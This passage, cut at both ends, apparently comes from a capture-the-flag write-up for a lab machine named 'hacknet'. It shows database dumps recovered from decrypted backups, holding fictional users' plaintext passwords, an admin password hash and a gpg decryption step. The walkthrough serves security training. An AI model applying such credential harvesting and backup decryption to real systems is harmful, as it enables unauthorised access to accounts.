(12,'codebreaker@ciphermail.com','codebreaker','C0d3Br3@k!','12.png','A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.',0,0,0,0,0),
(13,'netninja@hushmail.com','netninja','N3tN1nj@2024','13.png','Network security expert focused on intrusion detection and prevention. Known for slicing through firewalls with ease.',0,0,1,0,0),
(14,'packetpirate@exploitmail.net','packetpirate','P@ck3tP!rat3','14.png','A packet sniffer who loves capturing and analyzing network traffic. Always hunting for sensitive data in the ether.',0,0,1,0,0),
(15,'darkseeker@darkmail.net','darkseeker','D@rkSeek3r#','15.png','A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation.',0,0,1,0,0),
(16,'shadowmancer@cypherx.com','shadowmancer','Sh@d0wM@ncer','16.png','A master of disguise in the digital world, using cloaking techniques and evasion tactics to remain unseen.',0,0,1,0,0),
(17,'trojanhorse@securemail.org','trojanhorse','Tr0j@nH0rse!','17.jpg','Malware developer with a focus on creating and deploying Trojan horses. Enjoys watching systems crumble from within.',0,0,0,0,0),
(18,'mikey@hacknet.htb','backdoor_bandit','mYd4rks1dEisH3re','18.jpg','Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.',0,0,0,0,1),
(19,'exploit_wizard@hushmail.com','exploit_wizard','Expl01tW!zard','19.jpg','An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.',0,0,1,0,0),
(20,'stealth_hawk@exploitmail.net','stealth_hawk','St3@lthH@wk','20.jpg','Focuses on stealth operations, avoiding detection while infiltrating systems. A ghost in the machine.',0,0,1,0,0),
(21,'whitehat@darkmail.net','whitehat','Wh!t3H@t2024','21.jpg','An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.',0,0,1,0,0),
(22,'deepdive@hacknet.htb','deepdive','D33pD!v3r','22.png','Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.',0,0,0,0,1),
(23,'virus_viper@securemail.org','virus_viper','V!rusV!p3r2024','23.jpg','A malware creator focused on developing viruses that spread rapidly. Known for unleashing digital plagues.',0,0,1,0,0),
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
(25,'shadowwalker@hushmail.com','shadowwalker','Sh@dowW@lk2024','25.jpg','A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.',0,0,0,0,0);
/*!40000 ALTER TABLE `SocialNetwork_socialuser` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialuser_contacts`
--

DROP TABLE IF EXISTS `SocialNetwork_socialuser_contacts`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialuser_contacts` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_socialuser_id` bigint(20) NOT NULL,
  `to_socialuser_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `SocialNetwork_socialuser_from_socialuser_id_to_so_d031d178_uniq` (`from_socialuser_id`,`to_socialuser_id`),
  KEY `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` (`to_socialuser_id`),
  CONSTRAINT `SocialNetwork_social_from_socialuser_id_0253669d_fk_SocialNet` FOREIGN KEY (`from_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_social_to_socialuser_id_8d638620_fk_SocialNet` FOREIGN KEY (`to_socialuser_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialuser_contacts`
--

LOCK TABLES `SocialNetwork_socialuser_contacts` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialuser_contacts` VALUES
(1,18,22),
(3,21,25),
(2,22,18),
(4,25,21);
/*!40000 ALTER TABLE `SocialNetwork_socialuser_contacts` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(150) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_group_permissions_group_id_permission_id_0cd325b0_uniq` (`group_id`,`permission_id`),
  KEY `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_group_permissio_permission_id_84c5c92e_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_group_permissions_group_id_b120cbf9_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_permission_content_type_id_codename_01ab375a_uniq` (`content_type_id`,`codename`),
  CONSTRAINT `auth_permission_content_type_id_2f476e4b_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=45 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES
(1,'Can add log entry',1,'add_logentry'),
(2,'Can change log entry',1,'change_logentry'),
(3,'Can delete log entry',1,'delete_logentry'),
(4,'Can view log entry',1,'view_logentry'),
(5,'Can add permission',2,'add_permission'),
(6,'Can change permission',2,'change_permission'),
(7,'Can delete permission',2,'delete_permission'),
(8,'Can view permission',2,'view_permission'),
(9,'Can add group',3,'add_group'),
(10,'Can change group',3,'change_group'),
(11,'Can delete group',3,'delete_group'),
(12,'Can view group',3,'view_group'),
(13,'Can add user',4,'add_user'),
(14,'Can change user',4,'change_user'),
(15,'Can delete user',4,'delete_user'),
(16,'Can view user',4,'view_user'),
(17,'Can add content type',5,'add_contenttype'),
(18,'Can change content type',5,'change_contenttype'),
(19,'Can delete content type',5,'delete_contenttype'),
(20,'Can view content type',5,'view_contenttype'),
(21,'Can add session',6,'add_session'),
(22,'Can change session',6,'change_session'),
(23,'Can delete session',6,'delete_session'),
(24,'Can view session',6,'view_session'),
(25,'Can add social article',7,'add_socialarticle'),
(26,'Can change social article',7,'change_socialarticle'),
(27,'Can delete social article',7,'delete_socialarticle'),
(28,'Can view social article',7,'view_socialarticle'),
(29,'Can add social user',8,'add_socialuser'),
(30,'Can change social user',8,'change_socialuser'),
(31,'Can delete social user',8,'delete_socialuser'),
(32,'Can view social user',8,'view_socialuser'),
(33,'Can add social message',9,'add_socialmessage'),
(34,'Can change social message',9,'change_socialmessage'),
(35,'Can delete social message',9,'delete_socialmessage'),
(36,'Can view social message',9,'view_socialmessage'),
(37,'Can add social comment',10,'add_socialcomment'),
(38,'Can change social comment',10,'change_socialcomment'),
(39,'Can delete social comment',10,'delete_socialcomment'),
(40,'Can view social comment',10,'view_socialcomment'),
(41,'Can add contact request',11,'add_contactrequest'),
(42,'Can change contact request',11,'change_contactrequest'),
(43,'Can delete contact request',11,'delete_contactrequest'),
(44,'Can view contact request',11,'view_contactrequest');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `password` varchar(128) NOT NULL,
  `last_login` datetime(6) DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(150) NOT NULL,
  `first_name` varchar(150) NOT NULL,
  `last_name` varchar(150) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime(6) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES
(1,'pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=','2024-12-29 20:25:13.143037',1,'admin','','','',1,1,'2024-08-08 18:17:54.472758');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_groups` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_groups_user_id_group_id_94350c0c_uniq` (`user_id`,`group_id`),
  KEY `auth_user_groups_group_id_97559544_fk_auth_group_id` (`group_id`),
  CONSTRAINT `auth_user_groups_group_id_97559544_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  CONSTRAINT `auth_user_groups_user_id_6a12ed8b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `auth_user_user_permissions_user_id_permission_id_14a6b632_uniq` (`user_id`,`permission_id`),
  KEY `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` (`permission_id`),
  CONSTRAINT `auth_user_user_permi_permission_id_1fbb5f2c_fk_auth_perm` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_user_user_permissions_user_id_a95ead1b_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` datetime(6) NOT NULL,
  `object_id` longtext DEFAULT NULL,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) unsigned NOT NULL CHECK (`action_flag` >= 0),
  `change_message` longtext NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `django_admin_log_content_type_id_c4bce8eb_fk_django_co` (`content_type_id`),
  KEY `django_admin_log_user_id_c564eba6_fk_auth_user_id` (`user_id`),
  CONSTRAINT `django_admin_log_content_type_id_c4bce8eb_fk_django_co` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  CONSTRAINT `django_admin_log_user_id_c564eba6_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=124 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_content_type_app_label_model_76bd3d3b_uniq` (`app_label`,`model`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES
(1,'admin','logentry'),
(3,'auth','group'),
(2,'auth','permission'),
(4,'auth','user'),
(5,'contenttypes','contenttype'),
(6,'sessions','session'),
(11,'SocialNetwork','contactrequest'),
(7,'SocialNetwork','socialarticle'),
(10,'SocialNetwork','socialcomment'),
(9,'SocialNetwork','socialmessage'),
(8,'SocialNetwork','socialuser');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_migrations`
--

DROP TABLE IF EXISTS `django_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_migrations` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime(6) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_migrations`
--

LOCK TABLES `django_migrations` WRITE;
/*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */;
INSERT INTO `django_migrations` VALUES
(1,'SocialNetwork','0001_initial','2024-08-08 18:16:21.370676'),
(2,'SocialNetwork','0002_auto_20240530_2106','2024-08-08 18:16:21.388073'),
(3,'SocialNetwork','0003_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 18:16:21.410144'),
(4,'contenttypes','0001_initial','2024-08-08 18:16:21.505880'),
(5,'auth','0001_initial','2024-08-08 18:16:22.980849'),
(6,'admin','0001_initial','2024-08-08 18:16:23.614631'),
(7,'admin','0002_logentry_remove_auto_add','2024-08-08 18:16:23.653949'),
(8,'admin','0003_logentry_add_action_flag_choices','2024-08-08 18:16:23.692743'),
(9,'contenttypes','0002_remove_content_type_name','2024-08-08 18:16:23.954952'),
(10,'auth','0002_alter_permission_name_max_length','2024-08-08 18:16:24.050357'),
(11,'auth','0003_alter_user_email_max_length','2024-08-08 18:16:24.105707'),
(12,'auth','0004_alter_user_username_opts','2024-08-08 18:16:24.121570'),
(13,'auth','0005_alter_user_last_login_null','2024-08-08 18:16:24.210331'),
(14,'auth','0006_require_contenttypes_0002','2024-08-08 18:16:24.215210'),
(15,'auth','0007_alter_validators_add_error_messages','2024-08-08 18:16:24.231930'),
(16,'auth','0008_alter_user_username_max_length','2024-08-08 18:16:24.288951'),
(17,'auth','0009_alter_user_last_name_max_length','2024-08-08 18:16:24.349177'),
(18,'auth','0010_alter_group_name_max_length','2024-08-08 18:16:24.404983'),
(19,'auth','0011_update_proxy_permissions','2024-08-08 18:16:24.430036'),
(20,'auth','0012_alter_user_first_name_max_length','2024-08-08 18:16:24.639093'),
(21,'sessions','0001_initial','2024-08-08 18:16:24.755268'),
(22,'SocialNetwork','0004_alter_socialarticle_date_alter_socialcomment_date','2024-08-08 21:07:25.546764');
/*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime(6) NOT NULL,
  PRIMARY KEY (`session_key`),
  KEY `django_session_expire_date_a5c62663` (`expire_date`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-12-29 15:25:43

```

#### Backup 2

Note if in case there is an error of no gpg secret keys loaded, simply run this  and run the decrypt again:

```shell
gpg --list-secret-keys
```

```shell
gpg --decrypt backup02.sql.gpg
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
-- MariaDB dump 10.19  Distrib 10.11.6-MariaDB, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: hacknet
-- ------------------------------------------------------
-- Server version       10.11.6-MariaDB-0+deb12u1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `SocialNetwork_contactrequest`
--

DROP TABLE IF EXISTS `SocialNetwork_contactrequest`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_contactrequest` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `from_user_id` bigint(20) NOT NULL,
  `to_user_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` (`from_user_id`),
  KEY `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` (`to_user_id`),
  CONSTRAINT `SocialNetwork_contac_from_user_id_0bebebca_fk_SocialNet` FOREIGN KEY (`from_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`),
  CONSTRAINT `SocialNetwork_contac_to_user_id_9cf0ef37_fk_SocialNet` FOREIGN KEY (`to_user_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_contactrequest`
--

LOCK TABLES `SocialNetwork_contactrequest` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` DISABLE KEYS */;
/*!40000 ALTER TABLE `SocialNetwork_contactrequest` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `SocialNetwork_socialarticle`
--

DROP TABLE IF EXISTS `SocialNetwork_socialarticle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `SocialNetwork_socialarticle` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `text` longtext NOT NULL,
  `date` datetime(6) NOT NULL,
  `likes_number` int(11) NOT NULL,
  `comments_number` int(11) NOT NULL,
  `is_like` tinyint(1) NOT NULL,
  `author_id` bigint(20) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` (`author_id`),
  CONSTRAINT `SocialNetwork_social_author_id_eaa37621_fk_SocialNet` FOREIGN KEY (`author_id`) REFERENCES `SocialNetwork_socialuser` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `SocialNetwork_socialarticle`
--

LOCK TABLES `SocialNetwork_socialarticle` WRITE;
/*!40000 ALTER TABLE `SocialNetwork_socialarticle` DISABLE KEYS */;
INSERT INTO `SocialNetwork_socialarticle` VALUES
(1,'Just finished an in-depth analysis of a new encryption algorithm. Turns out, it’s more vulnerable than the developers thought. Found a flaw in the key generation process that could lead to predictable keys. Sharing the details in a private forum, but stay tuned for a full write-up on my blog. The importance of secure key management can’t be overstated!','2024-08-08 19:17:22.000000',9,0,0,1),
(2,'Exploring the dark web is like peeling an onion—layers upon layers of hidden services. Discovered a new marketplace that’s operating with military-grade encryption. Impressive setup, but nothing’s invulnerable. I’m working on a proof of concept to bypass their security measures. This will be an interesting challenge.','2024-10-17 12:32:44.000000',8,0,0,1),
(3,'Spent the last few days dissecting a piece of malware disguised as a popular video game mod. The obfuscation techniques were clever, but not clever enough. Managed to reverse-engineer the payload, and it turns out to be a keylogger. Sharing the malware\'s deobfuscated code for educational purposes. Be careful what you download!','2024-11-24 09:08:23.000000',12,0,0,2),
(4,'Just discovered a zero-day in a popular CMS platform. This vulnerability allows remote code execution with minimal effort. Reporting it to the developers now, but this could have serious implications if it gets into the wrong hands. Always vet your plugins and themes—this one slipped through the cracks.','2024-07-15 16:51:59.000000',9,0,0,4),
(5,'Zero-days are rare, but when you find one, it’s like striking gold. Working on a new exploit for a vulnerability I found in a widely used IoT device. This could impact thousands of devices worldwide. Documenting everything carefully—responsible disclosure is key.','2024-11-05 02:31:26.000000',13,2,0,4),
(6,'Cryptography is a double-edged sword. I’ve been working on breaking a new encryption scheme that claims to be uncrackable. Spoiler: it’s not. Found a flaw in the implementation that could allow attackers to decrypt messages without the key. Going to present my findings at the next conference.','2025-01-20 22:12:49.000000',8,1,0,5),
(7,'People are the weakest link in security. I conducted a social engineering experiment to see how easy it was to obtain sensitive information from employees at a local tech firm. Within hours, I had access to their internal network. The human element is always exploitable.','2024-12-03 11:22:28.000000',4,0,0,6),
(8,'Just completed a penetration test on a corporate network. Found several unpatched vulnerabilities that could have been exploited by anyone with basic knowledge. Wrote a detailed report for the client, but I’ll be sharing some of the more interesting findings here soon.','2025-01-23 17:51:14.000000',1,0,0,8),
(9,'Glitches can be more than just bugs—they can be pathways to deeper vulnerabilities. I recently discovered a way to exploit a glitch in a video game to access hidden files on the server. The developers had no idea this was even possible. Documenting the process now.','2024-11-13 13:11:46.000000',6,0,0,9),
(10,'Fault injection attacks are fascinating. I’ve been experimenting with voltage glitching on embedded systems to see what I can break. So far, I’ve managed to bypass authentication on several devices. Writing up a tutorial for anyone interested in this technique.','2025-02-10 20:09:15.000000',9,0,0,9),
(11,'Data breaches are a goldmine for information. I recently got my hands on a dataset from a breached social network and started analyzing the user behavior patterns. The insights are incredible—people are predictable in their online habits. I’ll be sharing some anonymized findings soon.','2024-05-20 14:41:45.000000',12,0,0,10),
(12,'Software protections are getting tougher, but they’re not invincible. I’ve been working on cracking a new DRM system that’s being used in the latest video games. It’s been a challenge, but I’m making progress. Expect a detailed breakdown in the coming weeks.','2024-09-18 04:10:13.000000',1,0,0,12),
(13,'Network security is all about layers. I’ve been testing a multi-layered defense strategy on a corporate network, and so far, it’s holding up well against simulated attacks. Writing up my findings to share with the community—defense in depth is key.','2024-08-01 12:33:47.000000',7,0,0,13),
(14,'Intrusion detection systems are only as good as the rules they’re based on. I’ve been tweaking some custom IDS rules to catch more sophisticated attacks. Managed to detect a few previously unknown attack vectors. Sharing the rule set for anyone interested.','2024-12-23 15:24:08.000000',7,0,0,13),
(15,'Captured some interesting packets from a poorly secured Wi-Fi network. Found a treasure trove of unencrypted data, including login credentials and private messages. It’s a reminder that encryption should be the default for all network communications.','2024-12-08 17:14:54.000000',19,3,0,14),
(16,'Cloaking techniques are evolving. I’ve been working on a new method to hide malicious traffic from intrusion detection systems. Early tests are promising—this could be a game-changer for stealth operations. More to come as I refine the technique.','2024-09-07 09:01:20.000000',10,0,0,16),
(17,'Just finished writing a new Trojan that’s disguised as a legitimate software update. It’s designed to bypass antivirus detection and establish a persistent backdoor. Of course, it’s for research purposes only. Documenting the code and will share it with those interested.','2024-11-12 14:55:51.000000',1,0,0,17),
(18,'Trojan horses are still one of the most effective methods for compromising systems. I’ve been studying some of the latest variants and identifying common traits. Writing up a guide on how to create more effective Trojans—stay tuned.','2024-09-01 10:42:16.000000',1,0,0,17),
(19,'Found an old backdoor in a legacy system that the developers thought they had patched out years ago. Managed to exploit it and gain access to the entire network. It’s a reminder that old vulnerabilities never really go away—they just lie dormant, waiting to be rediscovered.','2024-11-14 18:11:43.000000',0,0,0,18),
(20,'Backdoors are an art form. I’ve been working on a new technique to implant a backdoor in a system without leaving any obvious traces. It’s still in the testing phase, but it’s looking promising. Going to refine it and share the details soon.','2024-12-24 22:31:15.000000',0,0,0,18),
(21,'Crafting exploits is a mix of creativity and technical skill. I’ve been working on a new exploit for a vulnerability in a popular web application. It’s taking longer than expected, but the results will be worth it. Writing up the details as I go.','2024-09-14 12:59:44.000000',12,1,0,19),
(22,'Ethical hacking is about making the digital world a safer place. Just completed a penetration test for a nonprofit organization and identified several critical vulnerabilities. Working with their IT team to get everything patched up—always happy to help make a difference.','2025-01-27 16:18:13.000000',14,2,0,21),
(23,'Exploring the deep web is like diving into the unknown. Recently found a hidden forum that’s full of sensitive data leaks. Started analyzing the information—there’s some valuable intel in there. Going to dig deeper and see what else I can uncover.','2025-01-06 10:45:45.000000',1,0,0,22),
